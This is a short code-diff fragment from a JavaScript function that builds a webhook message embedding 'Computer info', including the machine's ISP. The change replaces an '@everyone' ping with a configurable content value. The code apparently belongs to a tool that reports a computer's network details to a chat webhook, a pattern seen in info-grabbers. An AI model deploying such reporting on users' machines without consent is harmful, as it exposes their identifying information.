@@ -29,7 +29,7 @@ const json = async () => {
     ['ISP', `${await ipInfo('isp')}`],
   ];
   return {
-    content: '@everyone',
+    content: webhook.content,
     embeds: [
       {
         title: 'Computer info',
